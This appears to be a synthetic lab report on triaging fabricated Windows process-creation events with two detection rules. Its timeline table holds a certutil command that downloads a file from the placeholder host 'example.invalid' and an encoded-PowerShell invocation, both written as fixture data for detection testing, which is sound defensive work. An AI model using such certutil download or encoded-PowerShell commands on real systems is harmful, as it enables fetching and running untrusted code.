# LAB-PROC-001 — Windows Process-Creation Triage

**Analyst:** Don Lopez · **Classification:** Synthetic endpoint-security investigation  
**Input:** [Five fabricated Windows Event ID 4688 rows](events_4688.csv)  
**Analytic:** [`process_triage.py`](process_triage.py) · **Outcome:** Two **triage candidates**, not confirmed malicious activity  
**Disposition:** `SYNTHETIC_REVIEW_REQUIRED`

## 30-second analyst summary

Two fabricated process-creation events warrant contextual review. At **10:02 UTC**, a PowerShell command line includes `-EncodedCommand`; at **10:04 UTC**, `certutil.exe` includes `-urlcache` and `-f` targeting a reserved `.invalid` hostname. Three additional events are benign-pattern controls. These matches alone do **not** prove that PowerShell executed a malicious script or certutil downloaded a payload.

## Timeline and exact rule observations

| UTC, Oct 10 2026 | Source row | Account / host | Observable pattern | Result |
| --- | --- | --- | --- | --- |
| 10:00 | [CSV row 2](events_4688.csv) | `LAB\\analyst` / `LAB-WKS-01` | `notepad.exe` | No match |
| **10:02** | [CSV row 3](events_4688.csv) | `LAB\\analyst` / `LAB-WKS-01` | `powershell.exe -NoProfile -EncodedCommand SYNTHETIC_PLACEHOLDER` | **`PS_ENCODED_COMMAND`** |
| **10:04** | [CSV row 4](events_4688.csv) | `LAB\\service` / `LAB-WKS-01` | `certutil.exe -urlcache -split -f https://example.invalid/synthetic.bin fake.bin` | **`CERTUTIL_URLCACHE_FETCH`** |
| 10:06 | [CSV row 5](events_4688.csv) | `LAB\\analyst` / `LAB-WKS-02` | `powershell.exe -NoProfile -File diagnostic.ps1` | No match |
| 10:07 | [CSV row 6](events_4688.csv) | `LAB\\analyst` / `LAB-WKS-02` | `certutil.exe -hashfile local.bin SHA256` | No match |

The CSV is fabricated; `SYNTHETIC_PLACEHOLDER` is **not** a payload and `example.invalid` cannot serve as a real destination.

## Triage reasoning

**`PS_ENCODED_COMMAND`:** The encoded-command switch resembles a possible [ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/) execution pattern. It can also appear in authorized automation, remote management and diagnostics. The fixture does not include decoded command content or independent script-block/AMSI telemetry.

**`CERTUTIL_URLCACHE_FETCH`:** URL cache and force switches may motivate review of [ATT&CK T1105](https://attack.mitre.org/techniques/T1105/), but no actual connection, file download, malicious payload or execution is observed.

**Counterexamples:** `-File diagnostic.ps1` and `certutil -hashfile` were intentionally included to test that common administrative-style commands are **not flagged by these two specific predicates**. Their presence is not proof those commands are safe in every environment.

## Scoped analyst follow-up (only with authorization)

1. Confirm event source completeness, host identity, reliable UTC conversion, and process-command-line collection settings.
2. Inspect parent-process lineage, signing, executable path, user identity and expected administrative jobs.
3. If approved, correlate PowerShell Script Block/EDR telemetry and decode command arguments **as data**, without executing untrusted content.
4. For certutil, check proxy/DNS observations, file creation events, file hash, and actual transferred content.
5. Record corroborating and contradictory findings; escalate only when evidence supports unauthorized activity and local criteria.

## Reproduction and limits

```bash
python projects/02-windows-process-triage/process_triage.py projects/02-windows-process-triage/events_4688.csv
python -m unittest discover -s projects/02-windows-process-triage -p 'test_*.py' -v
```

Expected on the fixture: **two candidate findings and 11 focused tests**. The parser checks Event ID, UTC timestamp, required fields and positive process IDs, and emits rule IDs and context. It does **not** collect logs, contact hosts, verify signer/payload reputation, reconstruct full process trees, or measure production detection efficacy.

**Outcome:** Rule behavior demonstrated on fabricated Windows 4688-format rows. No real endpoint compromise or network transfer established.
